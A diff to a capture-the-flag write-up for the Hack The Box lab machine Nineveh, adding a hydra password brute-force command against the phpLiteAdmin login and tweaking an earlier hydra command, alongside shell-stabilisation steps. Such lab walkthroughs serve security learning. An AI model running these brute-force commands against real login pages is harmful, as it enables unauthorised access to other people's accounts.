@@ -40,7 +40,7 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-m
 
 + Brute force using the wordlist: `/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt`
 ```
-hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
+hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 -f
 
 ```
 
@@ -88,6 +88,13 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-m
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5725fbfc-755a-438c-8500-071ee78463e5)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/55fafbd0-eb21-431a-be79-3db22feed399)
+
++ Alternatively, crack using hydra:
+```
+hydra -l admin -P /usr/share/seclists/Passwords/twitter-banned.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&F:Incorrect password." -f
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/727cd546-f846-4e1b-ac47-3994d89013bd)
 
 + `admin` username and `password123` password discovered on **https://nineveh.htb/db/**
 
@@ -162,8 +169,8 @@ reset
 terminal type? xterm
 export TERM=xterm  
 export SHELL=bash
-
 ```
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bffc80ba-8ed6-4c9a-99d4-8ca0c6533fd1)
 
 + **www-data** doesn't have read permission: `ls -l /home/amrois/`
